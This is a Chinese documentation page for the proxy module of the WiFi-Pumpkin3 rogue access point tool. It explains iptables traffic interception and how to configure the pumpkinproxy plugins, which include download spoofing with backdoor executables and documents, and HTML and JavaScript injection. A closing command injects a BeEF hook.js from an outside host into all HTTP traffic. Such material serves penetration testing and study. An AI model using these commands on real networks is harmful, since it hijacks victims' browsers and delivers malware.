# 代理

代理被设计用于向`WP3`核心添加特性并与接入点\(`AP`\)一起运行，通过`iptables`重定向所有流量。代理将在工作时拦截请求、必要时修改请求、处理请求或转发请求到原目的地。当一个用户连接到AP，透明代理将在请求传递给提供者之前拦截请求。

> 注意
>
> 因为设计上代理将操作所有数据包，重定向特定端口的所有数据，你每次只能运行一个代理。

可用的代理：

* pumpkinproxy - 拦截TCP协议流量的代理 [doc](https://wifipumpkin3.github.io/docs/getting-started#pumpkinproxy)
* captiveflask - 可用阻止没有在登陆页登陆的用户访问互联网  [doc](https://wifipumpkin3.github.io/docs/getting-started#captiveflask)
* noproxy - 代理不进行流量重定向

使用代理的基本命令：

如果你想选择一个代理，使用如下命令：

```text
wp3 > set proxy proxy_name
```

如果代理有子插件，当使用代理时你将看到一些可设置的子选项。你可以使用命令启用/禁用子插件，使用`TAB`来自动填充

```text
wp3 > set proxy_name.plugin_name true/false
```

以上的示例用于启用/禁用插件，你也可使用相同的规则sintax去配置插件参数。可以通过输入`info proxy_name`或仿照下面例子中的类型，使用`TAB`自动补全来获取参数

```text
wp3 > set pumpkinproxy.
pumpkinproxy.beef                            pumpkinproxy.html_inject
pumpkinproxy.beef.url_hook                   pumpkinproxy.html_inject.content_path
pumpkinproxy.downloadspoof                   pumpkinproxy.js_inject
pumpkinproxy.downloadspoof.backdoorExePath   pumpkinproxy.js_inject.url
pumpkinproxy.downloadspoof.backdoorPDFpath   pumpkinproxy.no-cache
pumpkinproxy.downloadspoof.backdoorWORDpath  pumpkinproxy.replaceImages
pumpkinproxy.downloadspoof.backdoorXLSpath   pumpkinproxy.replaceImages.path
wp3 > set pumpkinproxy.
```

让我们现在设置插件`beef`的`url_hook` 参数在所有http请求中注入javascript

```text
wp3 > set pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js
```

欢迎代理开发者和用户将代理加入到这个项目中，点击查看开发参考   [how to create a proxy](https://wifipumpkin3.github.io/docs/getting-started#development)

